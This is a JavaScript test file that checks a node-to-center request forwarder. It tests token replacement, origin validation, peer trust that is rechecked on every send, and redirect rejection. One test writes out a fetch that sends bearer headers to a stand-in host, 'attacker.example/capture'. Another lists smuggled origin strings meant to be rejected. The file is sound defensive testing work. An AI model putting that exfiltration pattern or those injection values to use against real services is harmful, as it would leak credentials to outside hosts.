import assert from "node:assert/strict";
import fs from "node:fs";
import http from "node:http";
import os from "node:os";
import path from "node:path";
import test, { after } from "node:test";

import {
  createNodeCenterAuthorizer,
  prepareNodeCenterRequest,
} from "../services/center-forward.js";
import {
  FORWARDED_PRINCIPAL_HEADER,
  normalizeHttpOrigin,
} from "../services/m2m-auth.js";
import { runRemoteAgentV2 } from "../services/devbench/remote-agent-client.js";
import { closeAppMarketMcpBridge } from "../services/appmarket-admin-mcp.js";

after(async () => {
  await closeAppMarketMcpBridge();
});

const sources = {
  devbench: fs.readFileSync(new URL("../routes/devbench.js", import.meta.url), "utf8"),
  feedback: fs.readFileSync(new URL("../routes/feedback.js", import.meta.url), "utf8"),
  repositories: fs.readFileSync(new URL("../services/work-report-repositories.js", import.meta.url), "utf8"),
  agentRunner: fs.readFileSync(new URL("../services/agent-runner.js", import.meta.url), "utf8"),
  agentLoop: fs.readFileSync(new URL("../services/devbench/agent-loop.js", import.meta.url), "utf8"),
  remoteAgent: fs.readFileSync(new URL("../services/devbench/remote-agent-client.js", import.meta.url), "utf8"),
  discovery: fs.readFileSync(new URL("../services/discovery.js", import.meta.url), "utf8"),
};

function nodeConfig(host = "http://center.example:3001") {
  return {
    role: "node",
    servers: {
      peers: ["http://center.example:3001"],
      selectedHost: host,
    },
    claudeProxyClient: {
      enabled: true,
      host,
      token: "machine-secret",
    },
  };
}

test("node forwarding replaces the browser bearer with its independent M2M token", () => {
  const prepared = prepareNodeCenterRequest({
    headers: {
      authorization: "Bearer browser-admin-secret",
      [FORWARDED_PRINCIPAL_HEADER]: "attacker-controlled",
    },
  }, {
    config: nodeConfig(),
    headers: { "Content-Type": "application/json" },
  });

  assert.equal(prepared.ok, true);
  assert.equal(prepared.base, "http://center.example:3001");
  assert.equal(prepared.redirect, "error");
  assert.equal(prepared.headers.get("Authorization"), "Bearer machine-secret");
  assert.equal(prepared.headers.has(FORWARDED_PRINCIPAL_HEADER), false);
});

test("center configuration accepts only a pure HTTP(S) origin", () => {
  assert.equal(normalizeHttpOrigin("https://center.example:8443/"), "https://center.example:8443");
  for (const unsafe of [
    "ftp://center.example",
    "https://user@center.example",
    "https://center.example/api",
    "https://center.example/?next=attacker",
    "https://center.example/?",
    "https://center.example/#fragment",
    "https://center.example/#",
    "https://center.example/segment/..",
    "https://center.example\\attacker",
    "https://center.example\n.attacker",
  ]) {
    assert.equal(normalizeHttpOrigin(unsafe), "", unsafe);
  }
});

test("polluted selectedHost cannot become a bearer exfiltration target", async () => {
  const attacker = "http://attacker.example:3999";
  const config = nodeConfig(attacker);
  let sends = 0;
  const prepared = prepareNodeCenterRequest({
    headers: { authorization: "Bearer browser-admin-secret" },
  }, { config });

  if (prepared.ok) {
    sends += 1;
    await fetch(`${prepared.base}/capture`, {
      headers: prepared.headers,
      redirect: prepared.redirect,
    });
  }

  assert.equal(prepared.ok, false);
  assert.equal(prepared.code, "CENTER_M2M_TARGET_NOT_TRUSTED");
  assert.equal(sends, 0);
});

test("missing outbound M2M token fails closed before a send", () => {
  const config = nodeConfig();
  config.claudeProxyClient.token = "";
  const prepared = prepareNodeCenterRequest(null, { config });
  assert.equal(prepared.ok, false);
  assert.equal(prepared.code, "CENTER_M2M_TOKEN_REQUIRED");
});

test("long-running Agent requests revalidate current peer trust before every send", async () => {
  let current = nodeConfig();
  const authorize = createNodeCenterAuthorizer("http://center.example:3001", {
    getCurrentConfig: () => current,
  });
  const first = await authorize({
    url: "http://center.example:3001/api/agent/v2/sessions",
  });
  assert.equal(first.token, "machine-secret");
  assert.equal(first.redirect, "error");

  current = {
    ...current,
    servers: { ...current.servers, peers: [] },
  };
  await assert.rejects(
    authorize({
      url: "http://center.example:3001/api/agent/v2/sessions/one/tool-results",
    }),
    (error) => error?.code === "CENTER_M2M_TARGET_NOT_TRUSTED",
  );
});

test("Agent V2 invokes the live trust authorizer again for each HTTP send", async () => {
  const receivedPaths = [];
  const server = http.createServer((req, res) => {
    receivedPaths.push(req.url);
    if (req.method === "GET" && req.url.startsWith("/api/agent/v2/sessions/session-1/events")) {
      res.writeHead(200, { "Content-Type": "text/event-stream" });
      res.end('id: 1\nevent: final\ndata: {"status":"completed","summary":"ok"}\n\n');
      return;
    }
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({
      ok: true,
      data: req.url.endsWith("/sessions")
        ? { id: "session-1", status: "created", lastEventId: 0 }
        : {},
    }));
  });
  await new Promise((resolve, reject) => {
    server.once("error", reject);
    server.listen(0, "127.0.0.1", resolve);
  });
  const origin = `http://127.0.0.1:${server.address().port}`;
  const projectRoot = fs.mkdtempSync(path.join(os.tmpdir(), "center-authorizer-"));
  let current = {
    role: "node",
    servers: { peers: [origin], selectedHost: origin },
    claudeProxyClient: { enabled: true, host: origin, token: "machine-secret" },
  };
  const liveAuthorizer = createNodeCenterAuthorizer(origin, {
    getCurrentConfig: () => current,
  });
  let authorizationChecks = 0;
  const authorizeRequest = async (request) => {
    authorizationChecks += 1;
    if (authorizationChecks === 3) {
      current = { ...current, servers: { ...current.servers, peers: [] } };
    }
    return liveAuthorizer(request);
  };

  try {
    await assert.rejects(
      runRemoteAgentV2({
        centerHost: origin,
        token: "stale-token-must-not-be-used",
        task: "security regression",
        tab: { id: "security-tab", mode: "local" },
        project: { id: "security-project", path: projectRoot },
        engine: "claude",
        maxRounds: 1,
        authorizeRequest,
      }),
      (error) => error?.code === "CENTER_M2M_TARGET_NOT_TRUSTED",
    );
    assert.equal(authorizationChecks, 3);
    assert.equal(receivedPaths.some((value) => value.endsWith("/turn")), false);
  } finally {
    await new Promise((resolve) => server.close(resolve));
    fs.rmSync(projectRoot, { recursive: true, force: true });
  }
});

test("all node-to-center forward helpers use M2M trust checks and reject redirects", () => {
  assert.match(sources.devbench, /prepareNodeCenterRequest\(req/);
  assert.match(sources.devbench, /redirect:\s*prepared\.redirect/);
  assert.doesNotMatch(sources.devbench, /forwardedAuthorizationHeaders/);

  assert.match(sources.feedback, /prepareNodeCenterRequest\(req/);
  assert.match(sources.feedback, /redirect:\s*prepared\.redirect/);
  assert.doesNotMatch(sources.feedback, /req\.headers\.authorization/);

  assert.match(sources.repositories, /isTrustedPeerOrigin/);
  assert.match(sources.repositories, /configuredOutboundM2MToken/);
  assert.match(sources.repositories, /redirect:\s*"error"/);

  assert.match(sources.agentRunner, /prepareNodeCenterRequest/);
  assert.match(sources.agentRunner, /redirect:\s*prepared\.redirect/);
  assert.match(sources.agentLoop, /prepareNodeCenterRequest/);
  assert.match(sources.agentLoop, /redirect:\s*"error"/);

  assert.match(sources.remoteAgent, /authorizedToken\(token, authorizeRequest/);
  assert.match(sources.remoteAgent, /redirect:\s*"error"/);

  assert.match(sources.discovery, /isTrustedPeerOrigin\(targetOrigin,\s*current\)/);
  assert.match(sources.discovery, /configuredPeerOutboundM2MToken\(current\)/);
  assert.match(sources.discovery, /peer M2M token is required/);
  assert.match(sources.discovery, /redirect:\s*"error"/);
});

test("DevBench replication reads remain behind machine authentication", () => {
  for (const marker of [
    'router.get("/audit-since"',
    'router.get("/userdata-since"',
  ]) {
    const start = sources.devbench.indexOf(marker);
    const end = sources.devbench.indexOf("\n});", start);
    assert.ok(start >= 0 && end > start, marker);
    assert.match(sources.devbench.slice(start, end + 4), /requirePeerReplicationAuth/);
  }
});
